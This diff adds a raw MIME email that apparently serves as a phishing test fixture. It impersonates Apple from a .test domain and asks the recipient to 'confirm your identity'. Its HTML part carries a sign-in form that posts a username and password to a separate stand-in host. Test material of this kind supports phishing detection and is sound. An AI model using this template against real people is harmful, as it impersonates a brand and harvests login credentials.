@@ -1,0 +1,25 @@
+From: "Apple" <info@mail-notice36.test>
+To: victim@example.test
+Subject: Apple: confirm your identity
+Date: Thu, 05 Nov 2026 10:00:00 +0000
+Message-ID: <6710622828@mail-notice36.test>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="===============2557869051017804668=="
+
+--===============2557869051017804668==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Please view this message in an HTML-capable client.
+
+--===============2557869051017804668==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body><p>Sign in to continue.</p><form action=3D"https://mail-notice41.=
+test/post" method=3D"post"><input name=3D"u"><input type=3D"password" name=3D=
+"p"><input type=3D"submit"></form></body></html>
+
+--===============2557869051017804668==--
